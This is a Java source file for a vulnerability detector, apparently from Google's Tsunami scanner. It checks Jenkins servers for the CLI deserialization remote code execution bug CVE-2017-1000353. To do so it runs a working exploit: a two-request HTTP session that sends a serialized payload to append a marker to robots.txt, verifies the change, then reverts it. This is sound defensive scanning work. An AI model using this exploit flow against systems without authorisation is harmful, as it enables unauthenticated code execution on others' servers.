/*
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.rce.cve20171000353;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.common.net.HttpHeaders.ACCEPT_ENCODING;
import static com.google.common.net.HttpHeaders.CONTENT_TYPE;
import static com.google.common.net.HttpHeaders.TRANSFER_ENCODING;
import static com.google.tsunami.common.net.http.HttpRequest.get;
import static com.google.tsunami.common.net.http.HttpRequest.post;
import static java.nio.charset.StandardCharsets.UTF_8;
import static java.util.concurrent.TimeUnit.SECONDS;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.common.io.Resources;
import com.google.common.util.concurrent.ListenableFuture;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpStatus;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import java.util.UUID;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.TimeoutException;
import javax.inject.Inject;

/** A {@link VulnDetector} that detects Jenkins CLI deserialization RCE. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "JenkinsCliDeserializeRceDetector",
    version = "0.1",
    description = "This detector checks for Jenkins CLI deserialization RCE (CVE-2017-1000353).",
    author = "Tsunami Team (tsunami-dev@google.com)",
    bootstrapModule = JenkinsCliDeserializeRceDetectorBootstrapModule.class)
public final class JenkinsCliDeserializeRceDetector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private static final String APPEND_PAYLOAD = "append.ser";
  private static final String DELETE_PAYLOAD = "remove.ser";
  private static final ByteString PREAMBLE =
      ByteString.copyFromUtf8(
          "<===[JENKINS REMOTINGCAPACITY]===>"
              + "rO0ABXNyABpodWRzb24ucmVtb3RpbmcuQ2FwYWJpbGl0eQAAAAAAAAABAgABSgAEbWFza3hw"
              + "AAAAAAAAAH4=");
  private static final ByteString PROTO = ByteString.copyFrom(new byte[] {0x00, 0x00, 0x00, 0x00});
  private static final String RANDOM_CONTENT = "790j6UFi7ClZyPlMAa9g";

  private final Clock utcClock;
  private final HttpClient httpClient;

  @Inject
  JenkinsCliDeserializeRceDetector(@UtcClock Clock utcClock, HttpClient httpClient) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("JenkinsCliDeserializeRceDetector starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  /**
   * Check if the web service is vulnerable. This implements the logic in
   * https://ssd-disclosure.com/ssd-advisory-cloudbees-jenkins-unauthenticated-code-execution/.
   */
  private boolean isServiceVulnerable(NetworkService networkService) {
    String rootUrl = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    String cliUrl = rootUrl + "cli";

    // Start by appending a string to the end of the robots.txt file.
    if (!runPayload(networkService, APPEND_PAYLOAD, cliUrl)) {
      return false;
    }

    // Then check if robots.txt is modified.
    if (!verifyRobotsTxt(networkService, rootUrl + "robots.txt")) {
      return false;
    }

    // Finally remove the change from the file.
    if (!runPayload(networkService, DELETE_PAYLOAD, cliUrl)) {
      logger.atWarning().log("Failed to remove the change in JenkinsCliDeserializeRceDetector.");
    }
    return true;
  }

  /**
   * Run the payload with name {@code payloadName} against the CLI URL.
   *
   * @return true if all the requests were successful (doesn't mean the exploit worked); false if
   *     any problem happened.
   */
  private boolean runPayload(NetworkService networkService, String payloadName, String cliUrl) {
    logger.atInfo().log("Running payload %s against %s", payloadName, cliUrl);

    String sessionId = UUID.randomUUID().toString();

    // Start the download request to initiate a session. This request is blocked until the second
    // one finishes.
    ListenableFuture<HttpResponse> downloadFuture =
        httpClient.sendAsync(
            post(cliUrl)
                .setHeaders(
                    HttpHeaders.builder()
                        .addHeader("Side", "download")
                        .addHeader("Session", sessionId)
                        .addHeader(CONTENT_TYPE, "application/x-www-form-urlencoded")
                        .addHeader(TRANSFER_ENCODING, "chunked")
                        .addHeader("Connection", "keep-alive")
                        .addHeader("Accept", "*/*")
                        .build())
                .setRequestBody(ByteString.copyFrom("1\r\n \r\n0\r\n\r\n", UTF_8))
                .build(),
            networkService);

    // Wait for 1 second for server to process the request. Note that this should fail with
    // TimeoutException if the request is set up correctly.
    try {
      downloadFuture.get(1, SECONDS);
    } catch (TimeoutException ex) {
      logger.atFine().log("Download request successfully blocked.");
    } catch (InterruptedException | ExecutionException ex) {
      logger.atFine().log("Failed to wait for download request.");
      return false;
    }

    ByteString payload;
    try {
      payload = getPayload(payloadName);
    } catch (IOException ex) {
      logger.atSevere().log("Failed to get payload %s", payloadName);
      return false;
    }

    try {
      // Send a second upload request with our payload. We don't care about the response.
      httpClient.send(
          post(cliUrl)
              .setHeaders(
                  HttpHeaders.builder()
                      .addHeader("Side", "upload")
                      .addHeader("Session", sessionId)
                      .addHeader(CONTENT_TYPE, "application/octet-stream")
                      .addHeader(ACCEPT_ENCODING, "")
                      .build())
              .setRequestBody(payload)
              .build(),
          networkService);

      // Wait for first request to finish.
      downloadFuture.get();

      // Sleep for some time to make subsequent verification more reliable.
      Thread.sleep(500);
    } catch (IOException | InterruptedException | ExecutionException ex) {
      logger.atFine().log("Failed to run payload in JenkinsCliDeserializeRceDetector.");
      return false;
    }
    return true;
  }

  private ByteString getPayload(String payloadName) throws IOException {
    return ByteString.copyFrom(
        ImmutableList.of(
            PREAMBLE,
            PROTO,
            ByteString.copyFrom(
                Resources.toByteArray(Resources.getResource(this.getClass(), payloadName)))));
  }

  private boolean verifyRobotsTxt(NetworkService networkService, String url) {
    try {
      HttpResponse response = httpClient.send(get(url).withEmptyHeaders().build(), networkService);
      return response.status() == HttpStatus.OK
          && response.bodyBytes().isPresent()
          && response.bodyBytes().get().toString("UTF-8").trim().contains(RANDOM_CONTENT);
    } catch (IOException ex) {
      logger.atFine().log("Failed to get contents of robots.txt from Jenkins server.");
    }
    return false;
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("GOOGLE")
                        .setValue("CVE_2017_1000353"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("Jenkins CLI Deserialization RCE")
                .setDescription(
                    "Jenkins versions 2.56 and earlier as well as 2.46.1 LTS and earlier are"
                        + " vulnerable to an unauthenticated remote code execution. An"
                        + " unauthenticated remote code execution vulnerability allowed attackers"
                        + " to transfer a serialized Java `SignedObject` object to the Jenkins"
                        + " CLI, that would be deserialized using a new `ObjectInputStream`,"
                        + " bypassing the existing blacklist-based protection mechanism. We're"
                        + " fixing this issue by adding `SignedObject` to the blacklist. We're"
                        + " also backporting the new HTTP CLI protocol from Jenkins 2.54 to LTS"
                        + " 2.46.2, and deprecating the remoting-based (i.e. Java serialization)"
                        + " CLI protocol, disabling it by default.")
                .setRecommendation("Upgrade Jenkins to the latest version."))
        .build();
  }
}
